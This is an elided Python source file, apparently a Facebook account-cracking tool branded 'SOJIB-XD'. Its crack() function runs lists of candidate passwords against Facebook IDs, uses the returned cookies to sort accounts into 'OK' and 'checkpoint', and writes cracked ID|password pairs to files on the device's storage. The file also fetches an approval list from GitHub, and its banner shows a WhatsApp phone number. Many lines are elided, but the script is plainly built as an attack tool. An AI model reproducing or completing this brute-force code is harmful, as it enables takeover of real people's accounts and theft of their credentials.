...
#Chnge Name 
	print('[[\x1b[1;92mтАв\x1b[1;97m] [\x1b[1;97mMR-SOJIB-XD]')
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/K1NG-SOJIB-69/K1NG-SOJIB-69/blob/main/Approval.txt').text
		ua=open('.bbnew.txt','w')
...
def banner():
 ...
 $$$$$$\   $$$$$$\     $$$$$\ $$$$$$\ $$$$$$$\  
$$  __$$\ $$  __$$\    \__$$ |\_$$  _|$$  __$$\    FACEBOOK : NOBITA
$$ /  \__|$$ /  $$ |      $$ |  $$ |  $$ |  $$ |
\$$$$$$\  $$ |  $$ |      $$ |  $$ |  $$$$$$$\ |    WHATSAPP: 01879614810
 \____$$\ $$ |  $$ |$$\   $$ |  $$ |  $$  __$$\ 
$$\   $$ |$$ |  $$ |$$ |  $$ |  $$ |  $$ |  $$ |
\$$$$$$  | $$$$$$  |\$$$$$$  |$$$$$$\ $$$$$$$  |
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}SOJIB-XD-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]тАФ{P}[{H}{ok}{P}]тАФ{P}[{k}{cp}{x}]тАФ[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [red]     тЬи SOJIB-CHECKPOINT тЬи [red]'))
				...
				cetak(nel('[green]      тЭдя╕ПтЬи SOJIB-OK тЭдя╕ПтЬи[green]')) 
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='SOJIB-XD OK'))
					ok+=1
					break
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]SOJIB-XD OK[/bold green]'))
					ok+=1
					break
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					statuscp = f'[тАв] ID       : {idf} [тАв] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='SOJIB-XD CP'))
					open('/sdcard/PINK-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
